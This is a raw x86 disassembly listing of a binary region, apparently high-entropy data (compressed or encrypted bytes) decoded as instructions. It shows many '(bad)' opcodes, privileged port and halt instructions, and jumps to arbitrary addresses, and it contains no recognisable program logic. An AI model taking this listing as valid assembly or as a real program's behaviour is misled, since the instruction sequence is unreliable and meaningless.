  440451:	test   DWORD PTR [ebp*1+0x3f72a9],0xff8c5e6
  44045c:	sub    DWORD PTR [edi+0x43],ebp
  44045f:	hlt    
  440460:	jb     0x440416
  440462:	in     al,0x86
  440464:	sub    al,0x54
  440466:	add    eax,0xfffffffd
  440469:	push   ss
  44046a:	or     BYTE PTR [eax-0x33],0x6e
  44046e:	cmp    edx,esp
  440470:	ins    BYTE PTR es:[edi],dx
  440471:	xor    BYTE PTR ds:[ecx],dl
  440474:	jb     0x440432
  440476:	inc    esp
  440477:	xor    eax,0x91817a1
  44047c:	bound  ebp,QWORD PTR [edx-0x6c537930]
  440482:	jge    0x440488
  440484:	rep lods al,BYTE PTR ds:[esi]
  440486:	inc    esp
  440487:	inc    eax
  440488:	bound  esi,QWORD PTR [edx]
  44048a:	lods   eax,DWORD PTR ds:[esi]
  44048b:	jge    0x440439
  44048d:	jnp    0x440494
  44048f:	je     0x440482
  440491:	add    BYTE PTR [edx-0xc],0xe2
  440495:	or     ch,BYTE PTR [ecx+0x4484566e]
  44049b:	adc    cl,ch
	...
  4404b5:	add    cl,dh
  4404b7:	add    al,0x0
  4404b9:	add    BYTE PTR [ecx],dh
  4404bb:	adc    eax,0x7aa14d83
  4404c0:	dec    ebp
  4404c1:	clc    
  4404c2:	push   ss
  4404c3:	inc    ebp
  4404c4:	sbb    BYTE PTR [ecx+0x7f],dl
  4404c7:	push   edx
  4404c8:	call   0x469362
  4404cd:	mov    eax,eax
  4404cf:	push   0x7b854781
  4404d4:	cmp    eax,0xfc43f4f4
  4404d9:	add    ecx,DWORD PTR [ebp+0x5de47582]
  4404df:	jns    0x44052e
  4404e1:	clc    
  4404e2:	pop    edx
  4404e3:	test   DWORD PTR [ebp-0x1cfdb2f3],ebp
  4404e9:	push   cs
  4404ea:	(bad)  
  4404eb:	in     eax,0x1f
  4404ed:	test   DWORD PTR [ebp+0xdc6fef5],ebx
  4404f3:	or     eax,0x24d0000
  4404f8:	mov    edi,0xdd47
  4404fd:	add    BYTE PTR ds:0xd06ff67,bl
  440503:	add    al,BYTE PTR [eax]
  440505:	not    edx
  440507:	adc    BYTE PTR [eax],al
  440509:	adc    BYTE PTR ds:0x85840702,bl
  44050f:	add    BYTE PTR [eax],al
  440511:	add    BYTE PTR [esi+0x1a00fbeb],cl
  440517:	es jns 0x440527
	...
  440532:	add    ch,bl
  440534:	add    DWORD PTR [ebx],ebp
  440536:	rcr    BYTE PTR [eax-0x1b],0x23
  44053a:	add    dl,bl
  44053c:	pop    ss
  44053d:	or     al,0x10
  44053f:	lea    edi,[eax+0x3d]
  440542:	hlt    
  440543:	inc    esi
  440544:	out    0x1f,al
  440546:	mov    DWORD PTR [eax-0xb3f827b],ebx
  44054c:	xchg   esp,esp
  44054e:	test   BYTE PTR [eax+eax*8],ch
  440551:	mov    WORD PTR [ebx-0x38],cs
  440554:	sbb    bl,cl
  440556:	je     0x44055b
  440558:	xor    eax,DWORD PTR [ecx+0x40]
  44055b:	fbld   TBYTE PTR [ebx-0x1b]
  44055e:	ins    BYTE PTR es:[edi],dx
  44055f:	jmp    0x440583
  440561:	dec    edi
  440562:	aam    0x7e
  440564:	fcomp  DWORD PTR [edi-0x4d4e0f78]
  44056a:	inc    ecx
  44056b:	xor    al,0x23
  44056d:	push   eax
  44056e:	clc    
  44056f:	ja     0x4405a9
  440571:	mov    al,ds:0x86b3e800
  440576:	inc    ebx
  440577:	pusha  
  440578:	add    bh,BYTE PTR [edi]
  44057a:	cld    
  44057b:	out    0x2e,al
  44057d:	stos   BYTE PTR es:[edi],al
  44057e:	inc    ecx
  44057f:	add    al,0x9c
  440581:	(bad)  
  440582:	push   esp
  440584:	pop    es
  440585:	or     DWORD PTR [ebp+0x53868fb9],eax
  44058b:	cmp    al,0x22
  44058d:	cmp    bl,BYTE PTR [eax]
  44058f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440590:	jmp    0xc95dede8
  440595:	std    
  440596:	inc    DWORD PTR [eax]
	...
  4405b0:	jg     0x4405c2
  4405b2:	mov    esp,0x86d3bb87
  4405b7:	inc    ebx
  4405b8:	and    ah,al
  4405ba:	inc    eax
  4405bb:	cld    
  4405bc:	imul   ebx
  4405be:	jge    0x44063b
  4405c0:	adc    BYTE PTR [ebx-0x6203ac74],bl
  4405c6:	add    BYTE PTR [ebx],0xe9
  4405c9:	fwait
  4405ca:	std    
  4405cb:	in     al,0x2
  4405cd:	pop    ss
  4405ce:	cmp    ah,BYTE PTR [eax]
  4405d0:	jno    0x4405c0
  4405d2:	sub    BYTE PTR [ecx],al
  4405d4:	mov    ebx,0xdbffd96e
  4405d9:	scas   al,BYTE PTR es:[edi]
  4405da:	std    
  4405db:	sar    bl,0x4
  4405de:	out    dx,eax
  4405df:	add    esi,esp
  4405e1:	add    al,0x12
  4405e3:	ds in  al,0x4
  4405e6:	in     eax,0x3
  4405e8:	hlt    
  4405e9:	sbb    ah,cl
  4405eb:	sub    BYTE PTR [esi+0x7eeb75f5],0x80
  4405f2:	out    0x3,eax
  4405f4:	hlt    
  4405f5:	add    al,0x66
  4405f7:	cmp    BYTE PTR [eax-0x3c8025fb],bl
  4405fd:	adc    edi,esp
  4405ff:	add    edi,ebp
  440601:	pop    edx
  440602:	in     eax,0xb4
  440604:	das    
  440605:	mov    eax,ds:0xa5a9c65e
  44060a:	and    eax,0x700d3681
  44060f:	dec    edi
  440610:	ins    BYTE PTR es:[edi],dx
  440611:	or     BYTE PTR [edi+0x81],bl
	...
  44062b:	add    BYTE PTR [eax],al
  44062d:	pop    esi
  44062e:	cmc    
  44062f:	xor    al,0xd6
  440631:	in     eax,dx
  440632:	pop    ebx
  440633:	sbb    bl,BYTE PTR [ecx+ecx*1]
  440636:	mov    esi,0xa0417ef2
  44063b:	call   0x71ad:0xd6c011b5
  440642:	dec    esp
  440643:	(bad)  
  440644:	jle    0x44067a
  440646:	sbb    ecx,ebx
  440648:	mov    BYTE PTR [ebp-0x444580c],bh
  44064e:	xchg   DWORD PTR [eax-0x44b28cfd],ecx
  440654:	mov    BYTE PTR [ebp-0x3bbdd61c],ah
  44065a:	add    eax,0x2ef403e7
  44065f:	out    0x29,eax
  440661:	hlt    
  440662:	cs out 0xab,eax
  440665:	ss mul esi
  440668:	add    esi,DWORD PTR [ecx+0x51]
  44066b:	out    dx,eax
  44066c:	mov    BYTE PTR [edi-0x63],al
  44066f:	add    BYTE PTR [eax+0x19],ah
  440672:	std    
  440673:	xchg   BYTE PTR [eax-0xdfe3b39],ch
  440679:	test   DWORD PTR [eax+eax*1],0x10ec10
  440680:	jmp    0x9a64a4f9
  440685:	xchg   ebp,eax
  440686:	and    BYTE PTR [ebx+0x5],bh
  440689:	lock or eax,0x4fba284
  44068f:	add    dh,ah
	...
  4406a9:	add    BYTE PTR [ecx],cl
  4406ab:	mov    ds:0x894b9cfa,eax
  4406b0:	retf   0x57ba
  4406b3:	loop   0x440731
  4406b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4406b6:	out    dx,eax
  4406b7:	mov    edx,DWORD PTR [ebx-0x2f]
  4406ba:	hlt    
  4406bb:	mov    esp,0x3157cf7d
  4406c0:	fidiv  DWORD PTR [edx+0x3c]
  4406c3:	mov    DWORD PTR [ebp+0x7ef497a8],edi
  4406c9:	enter  0x9df7,0x0
  4406cd:	jmp    0xaac9d3c6
  4406d2:	lods   al,BYTE PTR ss:[esi]
  4406d4:	or     BYTE PTR [eax-0x16dcf36a],ch
  4406da:	add    BYTE PTR [eax+eax*1],0xea
  4406de:	mov    DWORD PTR ss:[ebx-0xf],ecx
  4406e2:	ss test eax,0x8b34ea18
  4406e8:	inc    ecx
  4406e9:	shr    DWORD PTR [esi-0x1d],1
  4406ec:	das    
  4406ed:	mov    edx,0x2ef1f12c
  4406f2:	or     BYTE PTR [ecx],cl
  4406f4:	add    cl,ch
  4406f6:	mul    DWORD PTR [ecx]
  4406f8:	jns    0x4406df
  4406fa:	test   DWORD PTR ds:0x4fc8f84,0x6c70000
  440704:	bound  eax,QWORD PTR [eax]
  440706:	mov    DWORD PTR [esi],0x8f4ade8
  44070c:	add    BYTE PTR [ebx+0x0],cl
	...
  440726:	add    BYTE PTR [eax+0xe],ch
  440729:	add    DWORD PTR [edi-0xb],0x46303a8d
  440730:	push   ebx
  440731:	clc    
  440732:	(bad)  
  440733:	retf   0xd
  440736:	add    BYTE PTR [ebp-0x67f38a7b],bl
  44073c:	or     DWORD PTR [esp+ebx*8-0x7cfff95a],eax
  440743:	and    BYTE PTR [edx],cl
  440745:	dec    BYTE PTR [esi]
  440747:	sbb    DWORD PTR [ebx+eax*1+0x778b9d00],esi
  44074e:	add    al,0x8d
  440750:	ficom  DWORD PTR [ebx]
  440752:	mov    edx,DWORD PTR [ebx-0x76]
  440755:	fld    DWORD PTR [edi]
  440757:	scas   al,BYTE PTR es:[edi]
  440758:	and    BYTE PTR [ebx],0xf1
  44075b:	call   0xe106:0x4d00120e
  440762:	pop    edx
  440763:	push   esi
  440764:	push   es
  440765:	add    BYTE PTR [ebx+0x2a6b0aa3],al
  44076b:	jne    0x550b
  440770:	push   es
  440771:	add    BYTE PTR [eax],al
  440773:	into   
  440774:	sar    ebx,cl
  440776:	add    BYTE PTR [edx-0x76],dl
  440779:	cdq    
  44077a:	or     ebx,DWORD PTR ds:0xfb60706
  440780:	push   edi
  440781:	inc    ebp
  440782:	cld    
  440783:	xchg   esi,eax
  440784:	(bad)  
  440785:	retf   
  440786:	loopne 0x440767
  440788:	mov    DWORD PTR [esi+0x8],edi
	...
  4407a2:	add    BYTE PTR [eax],al
  4407a4:	test   BYTE PTR [ebx],bh
  4407a6:	clc    
  4407a7:	add    esi,DWORD PTR [ebp-0xbfc0977]
  4407ad:	mov    ebp,0xdcbf85cf
  4407b2:	cwde   
  4407b3:	test   DWORD PTR [edi+0x76ffa32e],esi
  4407b9:	dec    ebx
  4407ba:	add    DWORD PTR [edi-0x77d4fd5],eax
  4407c0:	neg    DWORD PTR [edx+0x56]
  4407c3:	stc    
  4407c4:	adc    BYTE PTR [ecx],dh
  4407c6:	mov    WORD PTR [ebx],?
  4407c8:	aaa    
  4407c9:	lods   al,BYTE PTR ds:[esi]
  4407ca:	(bad)  
  4407cb:	in     eax,0xf6
  4407cd:	repnz add al,0xb
  4407d0:	hlt    
  4407d1:	stos   DWORD PTR es:[edi],eax
  4407d2:	std    
  4407d3:	jl     0x44076f
  4407d5:	scas   al,BYTE PTR es:[edi]
  4407d6:	pushf  
  4407d7:	stc    
  4407d8:	out    dx,al
  4407d9:	stos   DWORD PTR es:[edi],eax
  4407da:	std    
  4407db:	test   BYTE PTR [ebx-0x6c0e86fd],dh
  4407e1:	mov    dl,0x82
  4407e3:	jnp    0x4407dd
  4407e5:	mov    cl,0xc6
  4407e7:	add    edi,esp
  4407e9:	stos   DWORD PTR es:[edi],eax
  4407ea:	std    
  4407eb:	inc    DWORD PTR [ecx]
  4407ed:	or     bl,al
  4407ef:	in     eax,0xf6
  4407f1:	cs lahf 
  4407f3:	std    
  4407f4:	pop    esp
  4407f5:	or     bh,cl
  4407f7:	jmp    DWORD PTR [ebx+0x6c]
  4407fa:	call   0xf400:0xdb232fe
  440801:	stos   DWORD PTR es:[edi],eax
  440802:	sub    dl,0xf7
  440805:	je     0x4407d4
  440807:	push   es
	...
  440820:	add    ah,dh
  440822:	stos   DWORD PTR es:[edi],eax
  440823:	jp     0x440868
  440825:	in     al,dx
  440826:	jb     0x440865
  440828:	sbb    bl,ah
  44082a:	stc    
  44082b:	inc    ebx
  44082c:	add    BYTE PTR [ebx],dh
  44082e:	mov    dl,0x10
  440830:	add    ah,dh
  440832:	stos   DWORD PTR es:[edi],eax
  440833:	(bad)  
  440834:	in     eax,0xf6
  440836:	cs lahf 
  440838:	std    
  440839:	sbb    al,0xd8
  44083b:	cli    
  44083c:	dec    DWORD PTR [ebx]
  44083e:	add    al,0x6e
  440840:	rol    DWORD PTR [ecx+0xadee2a3],0xb5
  440847:	ds xchg dh,ch
  44084a:	in     eax,0xd5
  44084c:	in     eax,0x68
  44084e:	and    al,BYTE PTR [ebx+0x3]
  440851:	in     eax,dx
  440852:	mov    BYTE PTR [esi],bh
  440854:	std    
  440855:	(bad)  [eax-0x602d861e]
  44085b:	pushf  
  44085c:	scas   eax,DWORD PTR es:[edi]
  44085d:	jno    0x44082e
  44085f:	mov    ss:0xfb218402,eax
  440865:	jb     0x4408a1
  440867:	clts   
  440869:	int3   
  44086a:	test   BYTE PTR [ecx],cl
  44086c:	jecxz  0x440887
  44086e:	mov    edi,0xc479be6e
  440873:	repnz rcl edi,cl
  440876:	lahf   
  440877:	repnz add dh,ah
  44087a:	lds    eax,FWORD PTR [eax]
  44087c:	adc    eax,ecx
  44087e:	(bad)
  440881:	jmp    0xf5e320
	...
  44089e:	leave  
  44089f:	mov    ebx,0x21f1ba16
  4408a4:	fisttp DWORD PTR [ecx]
  4408a6:	jae    0x4408f0
  4408a8:	daa    
  4408a9:	leave  
  4408aa:	cmc    
  4408ab:	push   cs
  4408ac:	out    0x3,eax
  4408ae:	hlt    
  4408af:	packssdw mm7,QWORD PTR [edx-0x6]
  4408b3:	add    al,0xe7
  4408b5:	enter  0xff5,0xe7
  4408b9:	add    esi,esp
  4408bb:	mov    esp,DWORD PTR [edx]
  4408bd:	inc    esp
  4408be:	jae    0x44090a
  4408c0:	fwait
  4408c1:	xchg   DWORD PTR [eax+edx*1],esi
  4408c4:	arpl   WORD PTR [esi+esi*8],cx
  4408c7:	add    al,0xe7
  4408c9:	jl     0x44087a
  4408cb:	mov    al,ds:0x9a6c2be
  4408d0:	add    BYTE PTR [edx+0x37],ah
  4408d3:	mov    BYTE PTR [ebx+0x75],cl
  4408d6:	mov    DWORD PTR [ebx-0x10],ecx
  4408d9:	and    dh,BYTE PTR [edi]
  4408db:	adc    eax,DWORD PTR [ebx]
  4408dd:	jb     0x440916
  4408df:	mov    BYTE PTR [ebx+0x5d],al
  4408e2:	jnp    0x4408a8
  4408e4:	or     DWORD PTR [ebp+0x72],esp
  4408e7:	push   es
  4408e8:	add    cl,ch
  4408ea:	pusha  
  4408eb:	dec    esp
  4408ec:	hlt    
  4408ed:	jb     0x440932
  4408ef:	popf   
  4408f0:	test   DWORD PTR [edi+ebp*2+0x6f994e4f],ebp
  4408f7:	jb     0x44091f
  4408f9:	jmp    0x158792f5
  4408fe:	test   DWORD PTR [ebx-0x8],0xc0
	...
  440919:	add    BYTE PTR [eax],al
  44091b:	cmp    ah,BYTE PTR [ecx-0x60985bd9]
  440921:	inc    esp
  440922:	adc    DWORD PTR [ecx],esp
  440924:	xor    al,0xf8
  440926:	push   0xffffffac
  440928:	adc    BYTE PTR [edi],ah
  44092a:	scas   al,BYTE PTR es:[edi]
  44092b:	aaa    
  44092c:	test   al,0xf2
  44092e:	loopne 0x440927
  440930:	add    al,0x7d
  440932:	out    0xf5,eax
  440934:	xor    DWORD PTR [edx],esp
  440936:	ins    BYTE PTR es:[edi],dx
  440937:	shr    eax,cl
  440939:	jmp    FWORD PTR [ecx+0x22]
  44093c:	mov    eax,ds:0xdf73de00
  440941:	add    eax,0xb20df7e9
  440946:	jmp    0x4408ec
  440948:	dec    ebx
  440949:	cld    
  44094a:	bound  esi,QWORD PTR ds:0x712be0d1
  440950:	ret    0x7008
  440953:	stos   BYTE PTR es:[edi],al
  440954:	pushf  
  440955:	std    
  440956:	shl    BYTE PTR [eax-0x66],0xa
  44095a:	sbb    eax,DWORD PTR [esi-0x77]
  44095d:	lds    ebp,FWORD PTR [edx+0x56]
  440960:	std    
  440961:	mov    esi,0x79068600
  440966:	ror    DWORD PTR [edx+eax*1],0x0
  44096a:	add    BYTE PTR [esi-0x2b07e38],dl
  440970:	ret    
  440971:	jecxz  0x440978
  440973:	xchg   BYTE PTR [eax+0x7b],ah
  440976:	loopne 0x440972
  440978:	xchg   ecx,ebx
  44097a:	setge  BYTE PTR [ecx+0x4b9]
	...
  440995:	add    BYTE PTR [eax],al
  440997:	add    BYTE PTR [ecx+eax*4],bl
  44099a:	add    al,0x83
  44099c:	dec    ebx
  44099d:	add    al,0x79
  44099f:	jg     0x44094e
  4409a1:	hlt    
  4409a2:	clc    
  4409a3:	(bad)  
  4409a4:	fstp   QWORD PTR [ebx]
  4409a6:	aas    
  4409a7:	fs push esp
  4409a9:	inc    ebp
  4409aa:	pop    esp
  4409ab:	rsqrtps xmm5,XMMWORD PTR [esi-0x7725000e]
  4409b2:	clc    
  4409b3:	push   ds
  4409b4:	call   0xbf54:0xfaf92b8d
  4409bb:	inc    edi
  4409bc:	test   DWORD PTR [edx],eax
  4409be:	add    BYTE PTR [eax],al
  4409c0:	(bad)  
  4409c1:	int    0xff
  4409c3:	adc    BYTE PTR [ebp+0x6a8b0002],bl
  4409c9:	cli    
  4409ca:	xor    cl,BYTE PTR [edi+0x39]
  4409cd:	ror    BYTE PTR [ecx-0x15],cl
  4409d0:	mov    es,WORD PTR [ebp+0x6ede0041]
  4409d6:	sti    
  4409d7:	jb     0x4409d8
  4409d9:	xor    DWORD PTR [ebp-0x4],0xbc7d9f4d
  4409e0:	add    al,BYTE PTR fs:[eax]
  4409e3:	psrlq  mm0,QWORD PTR [edx]
  4409e6:	test   DWORD PTR [ebp-0x67],0x6dd3c61a
  4409ed:	inc    ebx
  4409ee:	jnp    0x4409b6
  4409f0:	inc    ebp
  4409f1:	and    DWORD PTR [ebp-0x8],ecx
  4409f4:	hlt    
  4409f5:	stos   BYTE PTR es:[edi],al
  4409f6:	lds    edi,FWORD PTR [ebp+0x2a]
  4409f9:	stos   DWORD PTR es:[edi],eax
  4409fa:	das    
  4409fb:	fiadd  DWORD PTR [eax]
	...
  440a15:	outs   dx,DWORD PTR ds:[esi]
  440a16:	out    dx,eax
  440a17:	sbb    ecx,DWORD PTR [ecx]
  440a19:	arpl   WORD PTR [eax-0x14297fb8],bp
  440a1f:	add    eax,DWORD PTR [ebp+0x1a32b3f]
  440a25:	call   0x413e:0x84414014
  440a2c:	push   0xbf15667f
  440a31:	fild   QWORD PTR [edx+0x2f7ea7e]
  440a37:	cmp    DWORD PTR [esi+eiz*2+0x1b],ebx
  440a3b:	ins    BYTE PTR es:[edi],dx
  440a3c:	or     eax,0x36fdabf4
  440a41:	xor    eax,esp
  440a43:	cs sbb eax,0xa480aecf
  440a49:	adc    BYTE PTR [ebp+edi*8+0x5122f4ff],ch
  440a50:	push   0x530036fb
  440a55:	je     0x440a20
  440a57:	cmp    eax,0x21f9e700
  440a5c:	xchg   DWORD PTR [eax],ebp
  440a5e:	addr16 sub eax,0xec8433f9
  440a64:	inc    eax
  440a65:	or     al,0x3a
  440a67:	mov    ds:0x6fb738b,al
  440a6c:	add    ah,dh
  440a6e:	sub    BYTE PTR [edx],bh
  440a70:	ins    BYTE PTR es:[edi],dx
  440a71:	jge    0x440a1f
  440a73:	jl     0x440ab6
  440a75:	mov    al,0x18
  440a77:	xchg   edx,eax
  440a78:	lock add BYTE PTR [eax],al
	...
  440a8f:	add    BYTE PTR [eax],al
  440a91:	add    dh,dh
  440a93:	stos   DWORD PTR es:[edi],eax
  440a94:	std    
  440a95:	dec    ebp
  440a96:	sub    esi,0x66a55057
  440a9c:	std    
  440a9d:	add    ah,dh
  440a9f:	add    al,0xe7
  440aa1:	add    edx,edx
  440aa3:	icebp  
  440aa4:	imul   eax,DWORD PTR [esi-0x5c],0x34
  440aa8:	std    
  440aa9:	add    ebx,DWORD PTR [ebx+edi*1]
  440aac:	aad    0x3
  440aae:	hlt    
  440aaf:	mov    DWORD PTR [esp+ebp*4],ebx
  440ab2:	cdq    
  440ab3:	enter  0x7cdf,0xb7
  440ab7:	mov    esp,0x87fdc36c
  440abc:	inc    esp
  440abd:	sti    
  440abe:	add    ebx,DWORD PTR [ebp-0x3a73b990]
  440ac4:	loop   0x440ad7
  440ac6:	hlt    
  440ac7:	add    al,0xe7
  440ac9:	jp     0x440b00
  440acb:	and    esi,esp
  440acd:	inc    esi
  440ace:	push   esp
  440acf:	fisubr WORD PTR [ecx+0x4687ed1b]
  440ad5:	add    al,0xf4
  440ad7:	add    al,0x5e
  440ad9:	and    BYTE PTR ds:[ebp-0x18],bl
  440add:	add    esi,esp
  440adf:	add    al,0x36
  440ae1:	mov    ds:0x3bab4c71,eax
  440ae6:	adc    eax,ecx
  440ae8:	pop    esi
  440ae9:	jmp    FWORD PTR [edx]
  440aeb:	nop
  440aec:	sub    ah,al
  440aee:	mov    WORD PTR ds:0x8eb475f2,cs
  440af4:	lods   al,BYTE PTR ds:[esi]
  440af5:	mov    bh,0x0
	...
  440b0f:	leave  
  440b10:	ret    0xee79
  440b13:	or     BYTE PTR [edx],bl
  440b15:	jmp    0x440b19
  440b17:	in     eax,dx
  440b18:	xor    BYTE PTR [edx-0x15638404],0x75
  440b1f:	jb     0x440abc
  440b21:	and    al,0xb0
  440b23:	jno    0x440af0
  440b25:	mov    dh,0xa4
  440b27:	jns    0x440b75
  440b29:	sbb    eax,DWORD PTR [edx-0x27]
  440b2c:	ret    0xef
  440b2f:	sub    al,0x5d
  440b31:	add    al,ch
  440b33:	test   DWORD PTR [eax+eax*1],0x4982989a
  440b3a:	xor    eax,0x31f837bf
  440b3f:	adc    eax,0x76e58559
  440b44:	cmp    BYTE PTR [edi+0x90d80a8],0x3f
  440b4b:	xor    BYTE PTR [ebx+ecx*2+0x71c61d75],al
  440b52:	test   al,0x8d
  440b54:	pop    ebx
  440b55:	mov    edi,0x4383e881
  440b5a:	cmp    eax,0xf9f819d2
  440b5f:	and    al,0xf3
  440b61:	mov    esi,0xb20ce840
  440b66:	and    ch,al
  440b68:	mov    eax,ds:0x4e5d3825
  440b6d:	push   0x49414ec7
  440b72:	mov    ecx,0x0
	...
  440b8b:	add    BYTE PTR [eax-0x2bf97bb],bl
  440b91:	fwait
  440b92:	stc    
  440b93:	jmp    0x28c9399a
  440b98:	mov    bh,0xac
  440b9a:	or     dh,ah
  440b9c:	and    ebp,eax
  440b9e:	jge    0x440bc9
  440ba0:	not    cl
  440ba2:	out    dx,eax
  440ba3:	jp     0x440b4c
  440ba5:	mov    ss,WORD PTR [ebp+0x4f7e9]
  440bab:	push   0xffffffdb
  440bad:	cwde   
  440bae:	add    dh,bl
  440bb0:	jnp    0x440bfd
  440bb2:	or     cl,ch
  440bb4:	test   DWORD PTR ds:0x4fa0ebb2,0xc9a962fc
  440bbe:	loopne 0x440c22
  440bc0:	and    dl,BYTE PTR [ecx-0x3e31ffc2]
  440bc6:	or     BYTE PTR [ebx],al
  440bc8:	xchg   ebp,eax
  440bc9:	cwde   
  440bca:	scas   eax,DWORD PTR es:[edi]
  440bcb:	(bad)
  440bce:	cli    
  440bcf:	mov    al,ch
  440bd1:	push   0xb2dff033
  440bd6:	add    DWORD PTR [edi+0x5],0xffffff9a
  440bda:	scas   eax,DWORD PTR es:[edi]
  440bdb:	int    0x6e
  440bdd:	jl     0x440c02
  440bdf:	icebp  
  440be0:	cwde   
  440be1:	mov    DWORD PTR [edi],0xdc84
  440be7:	add    BYTE PTR [edx],ah
  440be9:	adc    BYTE PTR [edi+eax*2-0xd],cl
  440bed:	sbb    eax,0x83bb
	...
  440c06:	add    BYTE PTR [eax],al
  440c08:	add    BYTE PTR [ebp+0x4],ch
  440c0b:	jnp    0x440bcd
  440c0d:	push   cs
  440c0e:	(bad)  
  440c0f:	jecxz  0x440c13
  440c11:	fs fninit 
  440c14:	mov    DWORD PTR [eax-0x301184ae],ebx
  440c1a:	jg     0x440bb9
  440c1c:	add    ch,cl
  440c1e:	push   es
  440c1f:	pop    esi
  440c20:	adc    DWORD PTR [eax+0x4b0f0950],0x5b
  440c27:	or     DWORD PTR [ebp-0xf],0x8c8d3ed2
  440c2e:	add    eax,0xbf8ef033
  440c33:	test   bh,bh
  440c35:	push   ds
  440c36:	jmp    0x440c33
  440c38:	add    dl,al
  440c3a:	sbb    cl,0x7
  440c3d:	lea    eax,[esi]
  440c3f:	pop    es
  440c40:	mov    dh,0x9f
  440c42:	imul   eax,DWORD PTR [ebp-0x4],0xe0cb5816
  440c49:	push   ss
  440c4a:	fcmovnu st,st(3)
  440c4c:	inc    edx
  440c4d:	push   cs
  440c4e:	(bad)  
  440c4f:	or     BYTE PTR [ebx],al
  440c51:	xor    eax,0xf403391c
  440c56:	and    al,0x4f
  440c58:	clc    
  440c59:	pop    ds
  440c5a:	mov    esp,0xb747d732
  440c5f:	jns    0x440c1e
  440c61:	ja     0x440c2f
  440c63:	std    
  440c64:	jl     0x440c9a
  440c66:	scas   eax,DWORD PTR es:[edi]
  440c67:	jl     0x440cac
  440c69:	dec    eax
  440c6a:	ins    DWORD PTR es:[edi],dx
  440c6b:	cdq    
  440c6c:	std    
	...
  440c85:	add    BYTE PTR [ebx+0x33f9a561],al
  440c8b:	ja     0x440cce
  440c8d:	mov    esi,DWORD PTR [ebp-0x58101556]
  440c93:	ret    0x7b82
  440c96:	sbb    BYTE PTR [esi+esi*8-0x25c8f7d],ch
  440c9d:	(bad)  
  440c9e:	sti    
  440c9f:	fld    DWORD PTR [ecx]
  440ca1:	stc    
  440ca2:	mov    cl,0x27
  440ca4:	jns    0x440c70
  440ca6:	daa    
  440ca7:	dec    esp
  440ca8:	jns    0x440cf5
  440caa:	shr    BYTE PTR [ebp-0x7e],1
  440cad:	ret    0xaefc
  440cb0:	lds    ecx,FWORD PTR [ebx+0x537ca335]
  440cb6:	fadd   QWORD PTR [esi]
  440cb8:	mov    ah,0x6e
  440cba:	lods   eax,DWORD PTR ds:[esi]
  440cbb:	(bad)  
  440cbc:	cwde   
  440cbd:	test   DWORD PTR [edi+0x7779a42e],esi
  440cc3:	jmp    0x440cbd
  440cc5:	xchg   BYTE PTR [ecx],dh
  440cc7:	clc    
  440cc8:	ret    0xfbe5
  440ccb:	and    ebp,DWORD PTR [ebx-0x270d5407]
  440cd1:	mov    esi,0x4378fbf7
  440cd6:	mov    al,ds:0xf4e43eea
  440cdb:	stos   DWORD PTR es:[edi],eax
  440cdc:	std    
  440cdd:	(bad)  
  440cde:	jg     0x440d42
  440ce0:	adc    eax,0x3d26bbfd
  440ce5:	test   DWORD PTR fs:[edx+ebp*1],0x24
	...
  440d01:	add    BYTE PTR [eax],al
  440d03:	sub    ebp,ecx
  440d05:	jmp    0xe103:0xe7063e82
  440d0c:	pop    ss
  440d0d:	rol    DWORD PTR [ebx],cl
  440d0f:	loopne 0x440d09
  440d11:	ins    DWORD PTR es:[edi],dx
  440d12:	inc    eax
  440d13:	pop    eax
  440d14:	lods   eax,DWORD PTR ds:[esi]
  440d15:	out    0x78,al
  440d17:	mov    bl,0x4
  440d19:	pop    esi
  440d1a:	cmp    cl,ah
  440d1c:	cdq    
  440d1d:	sbb    al,0xb0
  440d1f:	(bad)  
  440d20:	mov    ebp,DWORD PTR [ebx]
  440d22:	cmp    esp,DWORD PTR [ecx+ebx*4+0x17a91c22]
  440d29:	fwait
  440d2a:	add    esp,DWORD PTR [edi-0x6fbda158]
  440d30:	add    eax,0x41cb242a
  440d35:	psubq  mm1,QWORD PTR [ecx-0x2558f09]
  440d3c:	test   BYTE PTR [edx-0x677f12f8],ch
  440d42:	add    esp,esi
  440d44:	add    al,0xc1
  440d46:	xchg   BYTE PTR [ebp-0xbfc1aeb],ch
  440d4c:	add    al,0xda
  440d4e:	jg     0x440db9
  440d50:	jmp    esi
  440d52:	add    edi,DWORD PTR [edi-0x80]
  440d55:	test   DWORD PTR [eax],0x3a6404f4
  440d5b:	push   eax
  440d5c:	mov    gs,eax
  440d5e:	jl     0x440d95
  440d60:	dec    ecx
  440d61:	je     0x440cf5
  440d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440d64:	add    esp,edi
  440d66:	add    eax,DWORD PTR [eax]
	...
  440d80:	cmp    cl,BYTE PTR [edx+edi*4-0x4cbf90dd]
  440d87:	push   ebx
  440d88:	sub    eax,eax
  440d8a:	out    0xfc,eax
  440d8c:	xchg   ebx,eax
  440d8d:	cwde   
  440d8e:	out    0x55,eax
  440d90:	jg     0x440dd2
  440d92:	add    BYTE PTR [ecx+0x27],bh
  440d95:	pop    ds
  440d96:	inc    DWORD PTR [eax]
  440d98:	not    ah
  440d9a:	(bad)  
  440d9b:	call   0x705ccf18
  440da0:	sub    edi,DWORD PTR [ebp-0x7ca2567d]
  440da6:	mov    ebx,0x859e8dd4
  440dab:	push   ds
  440dac:	in     al,dx
  440dad:	mov    ecx,DWORD PTR [ecx+0x4d]
  440db0:	iret   
  440db1:	xor    eax,0x95656450
  440db6:	(bad)  
  440db7:	call   0x2ecf54b3
  440dbc:	shl    BYTE PTR [edi+ecx*2],0x72
  440dc0:	in     eax,dx
  440dc1:	and    al,0xc1
  440dc3:	jmp    0xe94412bd
  440dc8:	cwde   
  440dc9:	inc    ebp
  440dca:	sbb    DWORD PTR fs:[ebx-0x5e06b6d0],ecx
  440dd1:	push   ds
  440dd2:	inc    BYTE PTR [eax-0x170011bf]
  440dd8:	jo     0x440d9b
  440dda:	sbb    BYTE PTR [eax+0x33],dh
  440ddd:	mov    ebp,0x82ed2983
  440de2:	sbb    al,0x5c
	...
  440dfc:	add    BYTE PTR [ebp-0x1c338263],cl
  440e02:	add    eax,0xc59f9c85
  440e07:	add    edx,ebx
  440e09:	test   DWORD PTR [eax+eax*1],0x21443e6
  440e10:	jmp    0xfd45d40c
  440e15:	test   DWORD PTR [eax+eax*1],0x298d36a
  440e1c:	fwait
  440e1d:	std    
  440e1e:	pop    ss
  440e1f:	jnp    0x440e3a
  440e21:	repnz xchg edi,eax
  440e23:	stc    
  440e24:	add    BYTE PTR [ebp+0x508b5cd1],bl
  440e2a:	fwait
